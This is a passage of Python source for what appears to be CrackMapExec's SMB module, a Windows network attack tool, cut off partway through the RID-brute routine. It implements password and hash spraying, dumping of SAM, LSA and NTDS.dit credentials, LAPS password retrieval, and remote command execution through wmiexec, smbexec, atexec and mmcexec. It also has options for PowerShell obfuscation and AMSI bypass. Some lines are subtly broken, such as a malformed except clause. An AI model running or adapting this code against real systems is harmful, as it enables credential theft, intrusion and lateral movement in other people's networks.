# -*- coding: utf-8 -*-

import socket
import os
import ntpath
import hashlib,binascii
from io import StringIO
from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb import SMB_DIALECT
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
from impacket.nmb import NetBIOSError, NetBIOSTimeout
from impacket.dcerpc.v5 import transport, lsat, lsad
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from impacket.dcerpc.v5.dcom.wmi import WBEM_FLAG_FORWARD_ONLY
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from cme.connection import *
from cme.logger import CMEAdapter
from cme.servers.smb import CMESMBServer
from cme.protocols.smb.wmiexec import WMIEXEC
from cme.protocols.smb.atexec import TSCH_EXEC
from cme.protocols.smb.smbexec import SMBEXEC
from cme.protocols.smb.mmcexec import MMCEXEC
from cme.protocols.smb.smbspider import SMBSpider
from cme.protocols.smb.passpol import PassPolDump
from cme.protocols.smb.samruser import UserSamrDump
from cme.protocols.ldap.smbldap import LDAPConnect
from cme.helpers.logger import highlight
from cme.helpers.misc import *
from cme.helpers.bloodhound import add_user_bh
from cme.helpers.powershell import create_ps_command
from pywerview.cli.helpers import *
from pywerview.requester import RPCRequester
from time import time
from datetime import datetime
from functools import wraps
from traceback import format_exc

smb_share_name = gen_random_string(5).upper()
smb_server = None

smb_error_status = [
    "STATUS_ACCOUNT_DISABLED",
    "STATUS_ACCOUNT_EXPIRED",
    "STATUS_ACCOUNT_RESTRICTION",
    "STATUS_INVALID_LOGON_HOURS",
    "STATUS_INVALID_WORKSTATION",
    "STATUS_LOGON_TYPE_NOT_GRANTED",
    "STATUS_PASSWORD_EXPIRED",
    "STATUS_PASSWORD_MUST_CHANGE",
    "STATUS_ACCESS_DENIED"
]

def requires_smb_server(func):
    def _decorator(self, *args, **kwargs):
        global smb_server
        global smb_share_name

        get_output = False
        payload = None
        methods = []

        try:
            payload = args[0]
        except IndexError:
            pass
        try:
            get_output = args[1]
        except IndexError:
            pass

        try:
            methods = args[2]
        except IndexError:
            pass

        if 'payload' in kwargs:
            payload = kwargs['payload']

        if 'get_output' in kwargs:
            get_output = kwargs['get_output']

        if 'methods' in kwargs:
            methods = kwargs['methods']

        if not payload and self.args.execute:
            if not self.args.no_output: get_output = True

        if get_output or (methods and ('smbexec' in methods)):
            if not smb_server:
                #with sem:
                logging.debug('Starting SMB server')
                smb_server = CMESMBServer(self.logger, smb_share_name, listen_port=self.args.smb_server_port, verbose=self.args.verbose)
                smb_server.start()

        output = func(self, *args, **kwargs)
        if smb_server is not None:
            #with sem:
            smb_server.shutdown()
            smb_server = None

        return output

    return wraps(func)(_decorator)

class smb(connection):

    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.lmhash = ''
        self.nthash = ''
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.smb_share_name = smb_share_name

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        smb_parser = parser.add_parser('smb', help="own stuff using SMB", parents=[std_parser, module_parser])
        smb_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        smb_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
        dgroup = smb_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, help="domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
        smb_parser.add_argument("--port", type=int, choices={445, 139}, default=445, help="SMB port (default: 445)")
        smb_parser.add_argument("--share", metavar="SHARE", default="C$", help="specify a share (default: C$)")
        smb_parser.add_argument("--smb-server-port", default="445", help="specify a server port for SMB", type=int)
        smb_parser.add_argument("--gen-relay-list", metavar='OUTPUT_FILE', help="outputs all hosts that don't require SMB signing to the specified file")
        smb_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
        smb_parser.add_argument("--smb-timeout", help="SMB connection timeout, default 3 secondes", type=int, default=2)
        smb_parser.add_argument("--laps", dest='laps', metavar="LAPS", type=str, help="LAPS authentification", nargs='?', const='administrator')
        
        cgroup = smb_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
        cegroup = cgroup.add_mutually_exclusive_group()
        cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
        cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')
        cegroup.add_argument("--ntds", choices={'vss', 'drsuapi'}, nargs='?', const='drsuapi', help="dump the NTDS.dit from target DCs using the specifed method\n(default: drsuapi)")
        #cgroup.add_argument("--ntds-history", action='store_true', help='Dump NTDS.dit password history')
        #cgroup.add_argument("--ntds-pwdLastSet", action='store_true', help='Shows the pwdLastSet attribute for each NTDS.dit account')

        egroup = smb_parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
        egroup.add_argument("--shares", action="store_true", help="enumerate shares and access")
        egroup.add_argument("--sessions", action='store_true', help='enumerate active sessions')
        egroup.add_argument('--disks', action='store_true', help='enumerate disks')
        egroup.add_argument("--loggedon-users", action='store_true', help='enumerate logged on users')
        egroup.add_argument('--users', nargs='?', const='', metavar='USER', help='enumerate domain users, if a user is specified than only its information is queried.')
        egroup.add_argument("--groups", nargs='?', const='', metavar='GROUP', help='enumerate domain groups, if a group is specified than its members are enumerated')
        egroup.add_argument('--computers', nargs='?', const='', metavar='COMPUTER', help='enumerate computer users')
        egroup.add_argument("--local-groups", nargs='?', const='', metavar='GROUP', help='enumerate local groups, if a group is specified then its members are enumerated')
        egroup.add_argument("--pass-pol", action='store_true', help='dump password policy')
        egroup.add_argument("--rid-brute", nargs='?', type=int, const=4000, metavar='MAX_RID', help='enumerate users by bruteforcing RID\'s (default: 4000)')
        egroup.add_argument("--wmi", metavar='QUERY', type=str, help='issues the specified WMI query')
        egroup.add_argument("--wmi-namespace", metavar='NAMESPACE', default='root\\cimv2', help='WMI Namespace (default: root\\cimv2)')

        sgroup = smb_parser.add_argument_group("Spidering", "Options for spidering shares")
        sgroup.add_argument("--spider", metavar='SHARE', type=str, help='share to spider')
        sgroup.add_argument("--spider-folder", metavar='FOLDER', default='.', type=str, help='folder to spider (default: root share directory)')
        sgroup.add_argument("--content", action='store_true', help='enable file content searching')
        sgroup.add_argument("--exclude-dirs", type=str, metavar='DIR_LIST', default='', help='directories to exclude from spidering')
        segroup = sgroup.add_mutually_exclusive_group()
        segroup.add_argument("--pattern", nargs='+', help='pattern(s) to search for in folders, filenames and file content')
        segroup.add_argument("--regex", nargs='+', help='regex(s) to search for in folders, filenames and file content')
        sgroup.add_argument("--depth", type=int, default=None, help='max spider recursion depth (default: infinity & beyond)')
        sgroup.add_argument("--only-files", action='store_true', help='only spider files')

        tgroup = smb_parser.add_argument_group("Files", "Options for put and get remote files")
        tgroup.add_argument("--put-file", nargs=2, metavar="FILE", help='Put a local file into remote target, ex: whoami.txt \\\\Windows\\\\Temp\\\\whoami.txt')
        tgroup.add_argument("--get-file", nargs=2, metavar="FILE", help='Get a remote file, ex: \\\\Windows\\\\Temp\\\\whoami.txt whoami.txt')

        cgroup = smb_parser.add_argument_group("Command Execution", "Options for executing commands")
        cgroup.add_argument('--exec-method', choices={"wmiexec", "mmcexec", "smbexec", "atexec"}, default=None, help="method to execute the command. Ignored if in MSSQL mode (default: wmiexec)")
        cgroup.add_argument('--force-ps32', action='store_true', help='force the PowerShell command to run in a 32-bit process')
        cgroup.add_argument('--no-output', action='store_true', help='do not retrieve command output')
        cegroup = cgroup.add_mutually_exclusive_group()
        cegroup.add_argument("-x", metavar="COMMAND", dest='execute', help="execute the specified command")
        cegroup.add_argument("-X", metavar="PS_COMMAND", dest='ps_execute', help='execute the specified PowerShell command')

        psgroup = smb_parser.add_argument_group('Powershell Obfuscation', "Options for PowerShell script obfuscation")
        psgroup.add_argument('--obfs', action='store_true', help='Obfuscate PowerShell scripts')
        psgroup.add_argument('--amsi-bypass', nargs=1, metavar="FILE", help='File with a custom AMSI bypass')
        psgroup.add_argument('--clear-obfscripts', action='store_true', help='Clear all cached obfuscated PowerShell scripts')

        return parser

    def proto_logger(self):
        self.logger = CMEAdapter(extra={
                                        'protocol': 'SMB',
                                        'host': self.host,
                                        'port': self.args.port,
                                        'hostname': self.hostname
                                        })

    def get_os_arch(self):
        try:
            stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            if self.args.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except (DCERPCException, e):
                if str(e).find('syntaxes_not_supported') >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64

        except Exception as e:
            logging.debug('Error retrieving os arch of {}: {}'.format(self.host, str(e)))

        return 0

    def enum_host_info(self):
        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

        try:
            self.conn.login('' , '')
        except:
            #if "STATUS_ACCESS_DENIED" in e:
            pass

        self.domain    = self.conn.getServerDNSDomainName()
        self.hostname  = self.conn.getServerName()
        self.server_os = self.conn.getServerOS()
        self.signing   = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection['RequireSigning']
        self.os_arch   = self.get_os_arch()

        self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))

        if not self.domain:
            self.domain = self.hostname

        self.db.add_computer(self.host, self.hostname, self.domain, self.server_os)

        try:
            '''
                DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                (go home Windows, you're drunk)
            '''
            self.conn.logoff()
        except:
            pass

        if self.args.domain:
            self.domain = self.args.domain
        
        if self.args.local_auth:
            self.domain = self.hostname

    def laps_search(self, username, password, ntlm_hash, domain):
        ldapco = LDAPConnect(self.domain, "389", self.domain)
        connection = ldapco.plaintext_login(domain, username[0] if username else '', password[0] if password else '', ntlm_hash[0] if ntlm_hash else '' )
        if connection == False:
            logging.debug('LAPS connection failed with account {}'.format(username))
            return False
        searchFilter = '(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(name='+ self.hostname +'))'
        attributes = ['ms-MCS-AdmPwd','samAccountname']
        result = connection.search(searchFilter=searchFilter,
                                                attributes=attributes,
                                                sizeLimit=0)

        msMCSAdmPwd = ''
        sAMAccountName = ''
        for item in result:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            for computer in item['attributes']:
                if str(computer['type']) == "sAMAccountName":
                    sAMAccountName = str(computer['vals'][0])
                else:
                    msMCSAdmPwd = str(computer['vals'][0])
            logging.debug("Computer: {:<20} Password: {} {}".format(sAMAccountName, msMCSAdmPwd, self.hostname))
        self.username = self.args.laps
        self.password = msMCSAdmPwd
        if msMCSAdmPwd == '':
            logging.debug('msMCSAdmPwd is empty, account cannot read LAPS property for {}'.format(self.hostname))
            return False
        if ntlm_hash:
            hash_ntlm = hashlib.new('md4', msMCSAdmPwd.encode('utf-16le')).digest()
            self.args.hash = [binascii.hexlify(hash_ntlm).decode()]
        self.domain = self.hostname
        return True

    def print_host_info(self):
        self.logger.info(u"{}{} (name:{}) (domain:{}) (signing:{}) (SMBv1:{})".format(self.server_os,
                                                                                      ' x{}'.format(self.os_arch) if self.os_arch else '',
                                                                                      self.hostname,
                                                                                      self.domain,
                                                                                      self.signing,
                                                                                      self.smbv1))
        if self.args.laps:
            return self.laps_search(self.args.username, self.args.password, self.args.hash, self.domain)
        return True

    def kerberos_login(self, domain, aesKey, kdcHost):
        #Re-connect since we logged off
        self.create_conn_obj()
        # dirty code to check if user is admin but pywerview does not support kerberos auth ...
        error = ''
        try:
            self.conn.kerberosLogin('', '', self.domain, self.lmhash, self.nthash, aesKey, kdcHost)
            # self.check_if_admin() # currently pywerview does not support kerberos auth
        except SessionError as e:
            error = e
        try:
            self.conn.connectTree("C$")
            self.admin_privs = True
        except SessionError as e:
            pass
        if not error:
            out = u'{}\\{} {}'.format(self.domain,
                                    self.conn.getCredentials()[0],
                                    highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
            self.logger.success(out)
            return True
        else:
            self.logger.error(u'{} {} {}'.format(self.domain, 
                                                 error, 
                                                 '({})'.format(desc) if self.args.verbose else ''))
            return False

        # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
        if self.signing:
            try:
                self.conn.logoff()
            except:
                pass
            self.create_conn_obj()

    def plaintext_login(self, domain, username, password):
        #Re-connect since we logged off
        self.create_conn_obj()
        try:
            if not self.args.laps:
                self.password = password
                self.username = username
            self.domain = domain
            self.conn.login(self.username, self.password, domain)

            self.check_if_admin()
            self.db.add_credential('plaintext', domain, self.username, self.password)

            if self.admin_privs:
                self.db.add_admin_user('plaintext', domain, self.username, self.password, self.host)

            out = u'{}\\{}:{} {}'.format(domain,
                                         self.username,
                                         self.password,
                                         highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))

            self.logger.success(out)
            add_user_bh(self.username, self.domain, self.logger, self.config)
            if not self.args.continue_on_success:
                return True
            elif self.signing: # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
                try:
                    self.conn.logoff()
                except:
                    pass
                self.create_conn_obj()

        except (SessionError) as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{}:{} {} {}'.format(domain,
                                                        self.username,
                                                        self.password,
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''),
                                                        color='magenta' if error in smb_error_status else 'red')          
            if error not in smb_error_status: 
                self.inc_failed_login(username)
                return False
            if not self.args.continue_on_success:
                return True  
        except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
            self.logger.error('Connection Error: {}'.format(e))
            return False

    def hash_login(self, domain, username, ntlm_hash):
        #Re-connect since we logged off
        self.create_conn_obj()
        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash

        try:
            self.hash = ntlm_hash
            if lmhash: self.lmhash = lmhash
            if nthash: self.nthash = nthash
            if not self.args.laps:
                self.username = username
            self.domain = domain
            self.conn.login(self.username, '', domain, lmhash, nthash)

            self.check_if_admin()
            self.db.add_credential('hash', domain, self.username, ntlm_hash)

            if self.admin_privs:
                self.db.add_admin_user('hash', domain, self.username, ntlm_hash, self.host)

            out = u'{}\\{}:{} {}'.format(domain,
                                         self.username,
                                         ntlm_hash,
                                         highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))

            self.logger.success(out)
            add_user_bh(self.username, self.domain, self.logger, self.config)
            if not self.args.continue_on_success:
                return True
            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.signing:
                try:
                    self.conn.logoff()
                except:
                    pass
                self.create_conn_obj()
        except (SessionError) as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{}:{} {} {}'.format(domain,
                                                        self.username,
                                                        ntlm_hash,
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''),
                                                        color='magenta' if error in smb_error_status else 'red')

            if error not in smb_error_status: 
                self.inc_failed_login(self.username)
                return False
            if not self.args.continue_on_success:
                return True 
        except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
            self.logger.error('Connection Error: {}'.format(e))
            return False

    def create_smbv1_conn(self):
        try:
            self.conn = SMBConnection(self.host, self.host, None, self.args.port, preferredDialect=SMB_DIALECT, timeout=self.args.smb_timeout)
            self.smbv1 = True
        except socket.error as e:
            if str(e).find('Connection reset by peer') != -1:
                logging.debug('SMBv1 might be disabled on {}'.format(self.host))
            return False
        except (Exception, NetBIOSTimeout) as e:
            logging.debug('Error creating SMBv1 connection to {}: {}'.format(self.host, e))
            return False

        return True

    def create_smbv3_conn(self):
        try:
            self.conn = SMBConnection(self.host, self.host, None, self.args.port, timeout=self.args.smb_timeout)
            self.smbv1 = False
        except socket.error:
            return False
        except (Exception, NetBIOSTimeout) as e:
            logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.host, e))
            return False

        return True

    def create_conn_obj(self):
        if self.create_smbv1_conn():
            return True
        elif self.create_smbv3_conn():
            return True

        return False

    def check_if_admin(self):
        lmhash = ''
        nthash = ''

        if self.hash:
            if self.hash.find(':') != -1:
                lmhash, nthash = self.hash.split(':')
            else:
                nthash = self.hash
        self.admin_privs = invoke_checklocaladminaccess(self.host, self.domain, self.username, self.password, lmhash, nthash)

    def gen_relay_list(self):
        if self.server_os.lower().find('windows') != -1 and self.signing is False:
            with sem:
                with open(self.args.gen_relay_list, 'a+') as relay_list:
                    if self.host not in relay_list.read():
                        relay_list.write(self.host + '\n')

    @requires_admin
    #@requires_smb_server
    def execute(self, payload=None, get_output=False, methods=None):

        if self.args.exec_method: methods = [self.args.exec_method]
        if not methods : methods = ['wmiexec', 'mmcexec', 'atexec', 'smbexec']

        if not payload and self.args.execute:
            payload = self.args.execute
            if not self.args.no_output: get_output = True

        for method in methods:

            if method == 'wmiexec':
                try:
                    exec_method = WMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.kerberos, self.aesKey, self.kdcHost, self.hash, self.args.share)
                    logging.debug('Executed command via wmiexec')
                    break
                except:
                    logging.debug('Error executing command via wmiexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'mmcexec':
                try:
                    exec_method = MMCEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
                    logging.debug('Executed command via mmcexec')
                    break
                except:
                    logging.debug('Error executing command via mmcexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'atexec':
                try:
                    exec_method = TSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.kerberos, self.aesKey, self.kdcHost, self.hash) #self.args.share)
                    logging.debug('Executed command via atexec')
                    break
                except:
                    logging.debug('Error executing command via atexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'smbexec':
                try:
                    exec_method = SMBEXEC(self.host, self.smb_share_name, self.conn, self.args.port, self.username, self.password, self.domain, self.kerberos, self.aesKey, self.kdcHost, self.hash, self.args.share)
                    logging.debug('Executed command via smbexec')
                    break
                except:
                    logging.debug('Error executing command via smbexec, traceback:')
                    logging.debug(format_exc())
                    continue

        if hasattr(self, 'server'): self.server.track_host(self.host)

        output = u'{}'.format(exec_method.execute(payload, get_output).strip())

        if self.args.execute or self.args.ps_execute:
            self.logger.success('Executed command {}'.format('via {}'.format(self.args.exec_method) if self.args.exec_method else ''))
            buf = StringIO(output).readlines()
            for line in buf:
                self.logger.highlight(line.strip())

        return output

    @requires_admin
    def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, dont_obfs=False):
        if not payload and self.args.ps_execute:
            payload = self.args.ps_execute
            if not self.args.no_output: get_output = True
        
        amsi_bypass = self.args.amsi_bypass[0] if self.args.amsi_bypass else None 
        if os.path.isfile(payload):
            with open(payload) as commands:
                for c in commands:
                    self.execute(create_ps_command(c, force_ps32=force_ps32, dont_obfs=dont_obfs, custom_amsi=amsi_bypass), get_output, methods)
        else:
            self.execute(create_ps_command(payload, force_ps32=force_ps32, dont_obfs=dont_obfs, custom_amsi=amsi_bypass), get_output, methods)
        return ''

    def shares(self):
        temp_dir = ntpath.normpath("\\" + gen_random_string())
        computer_id = self.db.get_computers(filterTerm=self.host)[0][0]
        try:
            user_id = self.db.get_user(
                self.domain.split('.')[0].upper(),
                self.username
            )[0][0]
        except:
            pass
        permissions = []

        try:
            for share in self.conn.listShares():
                share_name = share['shi1_netname'][:-1]
                share_remark = share['shi1_remark'][:-1]
                share_info = {'name': share_name, 'remark': share_remark, 'access': []}
                read = False
                write = False
                try:
                    self.conn.listPath(share_name, '*')
                    read = True
                    share_info['access'].append('READ')
                except SessionError:
                    pass

                try:
                    self.conn.createDirectory(share_name, temp_dir)
                    self.conn.deleteDirectory(share_name, temp_dir)
                    write = True
                    share_info['access'].append('WRITE')
                except SessionError:
                    pass

                permissions.append(share_info)

                if share_name != "IPC$":
                    try:
                        self.db.add_share(computer_id, user_id, share_name, share_remark, read, write)
                    except:
                        pass

            self.logger.success('Enumerated shares')
            self.logger.highlight('{:<15} {:<15} {}'.format('Share', 'Permissions', 'Remark'))
            self.logger.highlight('{:<15} {:<15} {}'.format('-----', '-----------', '------'))
            for share in permissions:
                name   = share['name']
                remark = share['remark']
                perms  = share['access']

                self.logger.highlight(u'{:<15} {:<15} {}'.format(name, ','.join(perms), remark))
        except (SessionError, UnicodeEncodeError) as e:
            self.logger.error('Error enumerating shares: {}'.format(e))     
        except Exception as e:
            error = e.getErrorString()
            self.logger.error('Error enumerating shares: {}'.format(error),
                            color='magenta' if error in smb_error_status else 'red')          

        return permissions

    def get_dc_ips(self):
        dc_ips = []

        for dc in self.db.get_domain_controllers(domain=self.domain):
            dc_ips.append(dc[1])

        if not dc_ips:
            dc_ips.append(self.host)

        return dc_ips

    def sessions(self):
        try:
            sessions = get_netsession(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
            self.logger.success('Enumerated sessions')
            for session in sessions:
                if session.sesi10_cname.find(self.local_ip) == -1:
                    self.logger.highlight('{:<25} User:{}'.format(session.sesi10_cname, session.sesi10_username))
            return sessions
        except:
            pass      

    def disks(self):
        disks = []
        try:
            disks = get_localdisks(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
            self.logger.success('Enumerated disks')
            for disk in disks:
                self.logger.highlight(disk.disk)
        except Exception as e:
            error, desc = e.getErrorString()
            self.logger.error('Error enumerating disks: {}'.format(error),
                            color='magenta' if error in smb_error_status else 'red')

        return disks

    def local_groups(self):
        groups = []
        #To enumerate local groups the DC IP is optional, if specified it will resolve the SIDs and names of any domain accounts in the local group
        for dc_ip in self.get_dc_ips():
            try:
                groups = get_netlocalgroup(self.host, dc_ip, '', self.username,
                                           self.password, self.lmhash, self.nthash, queried_groupname=self.args.local_groups,
                                           list_groups=True if not self.args.local_groups else False, recurse=False)

                if self.args.local_groups:
                    self.logger.success('Enumerated members of local group')
                else:
                    self.logger.success('Enumerated local groups')

                for group in groups:
                    if group.name:
                        if not self.args.local_groups:
                            self.logger.highlight('{:<40} membercount: {}'.format(group.name, group.membercount))
                            self.db.add_group(self.hostname, group.name)
                        else:
                            domain, name = group.name.split('/')
                            self.logger.highlight('{}\\{}'.format(domain.upper(), name))
                            try:
                                group_id = self.db.get_groups(groupName=self.args.local_groups, groupDomain=domain)[0][0]
                            except IndexError:
                                group_id = self.db.add_group(domain, self.args.local_groups)

                            # yo dawg, I hear you like groups. So I put a domain group as a member of a local group which is also a member of another local group.
                            # (╯°□°）╯︵ ┻━┻

                            if not group.isgroup:
                                self.db.add_user(domain, name, group_id)
                            elif group.isgroup:
                                self.db.add_group(domain, name)
                break
            except Exception as e:
                self.logger.error('Error enumerating local groups of {}: {}'.format(self.host, e))

        return groups

    def domainfromdsn(self, dsn):
        dsnparts = dsn.split(',')
        domain = ""
        for part in dsnparts:
            k,v = part.split("=")
            if k == "DC":
                if domain=="":
                    domain = v
                else:
                    domain = domain+"."+v
        return domain

    def domainfromdnshostname(self, dns):
        dnsparts = dns.split(".")
        domain = ".".join(dnsparts[1:])
        return domain, dnsparts[0]+"$"

    def groups(self):
        groups = []
        for dc_ip in self.get_dc_ips():
            if self.args.groups:
                try:
                    groups = get_netgroupmember(dc_ip, self.domain, self.username, password=self.password,
                                                lmhash=self.lmhash, nthash=self.nthash, queried_groupname=self.args.groups, queried_sid=str(),
                                                queried_domain=str(), ads_path=str(), recurse=False, use_matching_rule=False,
                                                full_data=False, custom_filter=str())

                    self.logger.success('Enumerated members of domain group')
                    for group in groups:
                        self.logger.highlight('{}\\{}'.format(group.memberdomain, group.membername))

                        try:
                            group_id = self.db.get_groups(groupName=self.args.groups, groupDomain=group.groupdomain)[0][0]
                        except IndexError:
                            group_id = self.db.add_group(group.groupdomain, self.args.groups)

                        if not group.isgroup:
                            self.db.add_user(group.memberdomain, group.membername, group_id)
                        elif group.isgroup:
                            self.db.add_group(group.groupdomain, group.groupname)
                    break
                except Exception as e:
                    self.logger.error('Error enumerating domain group members using dc ip {}: {}'.format(dc_ip, e))
            else:
                try:
                    groups = get_netgroup(dc_ip, self.domain, self.username, password=self.password,
                                          lmhash=self.lmhash, nthash=self.nthash, queried_groupname=str(), queried_sid=str(),
                                          queried_username=str(), queried_domain=str(), ads_path=str(),
                                          admin_count=False, full_data=True, custom_filter=str())

                    self.logger.success('Enumerated domain group(s)')
                    for group in groups:
                        self.logger.highlight('{:<40} membercount: {}'.format(group.samaccountname, len(group.member) if hasattr(group, 'member') else 0))

                        if bool(group.isgroup) is True:
                            # Since there isn't a groupmemeber attribute on the returned object from get_netgroup we grab it from the distinguished name
                            domain = self.domainfromdsn(group.distinguishedname)
                            self.db.add_group(domain, group.samaccountname)
                    break
                except Exception as e:
                    self.logger.error('Error enumerating domain group using dc ip {}: {}'.format(dc_ip, e))

        return groups

    def users(self):
        users = []
        for dc_ip in self.get_dc_ips():
            try:
                users = get_netuser(dc_ip, self.domain, self.username, password=self.password, lmhash=self.lmhash,
                                    nthash=self.nthash, queried_username=self.args.users, queried_domain='', ads_path=str(),
                                    admin_count=False, spn=False, unconstrained=False, allow_delegation=False,
                                    custom_filter=str())

                self.logger.success('Enumerated domain user(s)')
                for user in users:
                    domain = self.domainfromdsn(user.distinguishedname)
                    self.logger.highlight('{}\\{:<30} badpwdcount: {} baddpwdtime: {}'.format(domain,user.samaccountname,getattr(user,'badpwdcount',0),getattr(user, 'badpasswordtime','')))
                    #self.db.add_user(domain, user.samaccountname)
                break
            except Exception as e:
                self.logger.error('Error enumerating domain users using dc ip {}: {}'.format(dc_ip, e))
                self.logger.info('Trying with SAMRPC protocol')
                users = UserSamrDump(self).dump()
                break
        return users

    def computers(self):
        computers = []
        for dc_ip in self.get_dc_ips():
            try:
                computers = get_netcomputer(dc_ip, self.domain, self.username, password=self.password, lmhash=self.lmhash,
                                    nthash=self.nthash, queried_domain='', ads_path=str(), custom_filter=str())

                self.logger.success('Enumerated domain computer(s)')
                for computer in computers:
                    domain, computerclean = self.domainfromdnshostname(computer.dnshostname)
                    self.logger.highlight('{}\\{:<30}'.format(domain, computerclean))
                break
            except Exception as e:
                self.logger.error('Error enumerating domain computers using dc ip {}: {}'.format(dc_ip, e))
                break
        return computers

    def loggedon_users(self):
        loggedon = []
        try:
            loggedon = get_netloggedon(self.host, self.domain, self.username, self.password, lmhash=self.lmhash, nthash=self.nthash)
            self.logger.success('Enumerated loggedon users')
            for user in loggedon:
                self.logger.highlight('{}\\{:<25} {}'.format(user.wkui1_logon_domain, user.wkui1_username,
                                                           'logon_server: {}'.format(user.wkui1_logon_server) if user.wkui1_logon_server else ''))
        except Exception as e:
            self.logger.error('Error enumerating logged on users: {}'.format(e))

        return loggedon

    def pass_pol(self):
        return PassPolDump(self).dump()

    @requires_admin
    def wmi(self, wmi_query=None, namespace=None):
        records = []
        if not namespace:
            namespace = self.args.wmi_namespace

        try:
            rpc = RPCRequester(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
            rpc._create_wmi_connection(namespace=namespace)

            if wmi_query:
                query = rpc._wmi_connection.ExecQuery(wmi_query, lFlags=WBEM_FLAG_FORWARD_ONLY)
            else:
                query = rpc._wmi_connection.ExecQuery(self.args.wmi, lFlags=WBEM_FLAG_FORWARD_ONLY)
        except Exception as e:
            self.logger.error('Error creating WMI connection: {}'.format(e))
            return records

        while True:
            try:
                wmi_results = query.Next(0xffffffff, 1)[0]
                record = wmi_results.getProperties()
                records.append(record)
                for k,v in record.items():
                    self.logger.highlight('{} => {}'.format(k,v['value']))
                self.logger.highlight('')
            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise e
                else:
                    break

        return records

    def spider(self, share=None, folder='.', pattern=[], regex=[], exclude_dirs=[], depth=None, content=False, onlyfiles=True):
        spider = SMBSpider(self.conn, self.logger)

        self.logger.info('Started spidering')
        start_time = time()
        if not share:
            spider.spider(self.args.spider, self.args.spider_folder, self.args.pattern,
                          self.args.regex, self.args.exclude_dirs, self.args.depth,
                          self.args.content, self.args.only_files)
        else:
            spider.spider(share, folder, pattern, regex, exclude_dirs, depth, content, onlyfiles)

        self.logger.info("Done spidering (Completed in {})".format(time() - start_time))

        return spider.results

    def rid_brute(self, maxRid=None):
        entries = []
        if not maxRid:
            maxRid = int(self.args.rid_brute)

        KNOWN_PROTOCOLS = {
            135: {'bindstr': r'ncacn_ip_tcp:%s',           'set_host': False},
            139: {'bindstr': r'ncacn_np:{}[\pipe\lsarpc]', 'set_host': True},
            445: {'bindstr': r'ncacn_np:{}[\pipe\lsarpc]', 'set_host': True},
            }

        try:
            stringbinding = KNOWN_PROTOCOLS[self.args.port]['bindstr'].format(self.host)
            logging.debug('StringBinding {}'.format(stringbinding))
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(self.args.port)

            if KNOWN_PROTOCOLS[self.args.port]['set_host']:
                rpctransport.setRemoteHost(self.host)

            if hasattr(rpctransport, 'set_credentials'):
